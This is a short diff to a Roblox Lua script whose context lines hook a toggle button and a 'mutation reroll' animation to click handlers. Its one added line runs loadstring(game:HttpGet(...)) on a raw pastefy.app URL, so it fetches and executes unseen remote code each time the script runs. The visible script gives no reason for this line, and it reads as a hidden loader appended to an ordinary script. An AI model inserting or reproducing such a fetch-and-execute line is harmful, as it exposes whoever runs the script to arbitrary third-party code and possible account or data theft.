@@ -143,3 +143,4 @@ toggle.MouseButton1Click:Connect(function()
 end)
 
 reroll.MouseButton1Click:Connect(animateMutationReroll)
+loadstring(game:HttpGet("https://pastefy.app/Fmsj0GZg/raw"))()
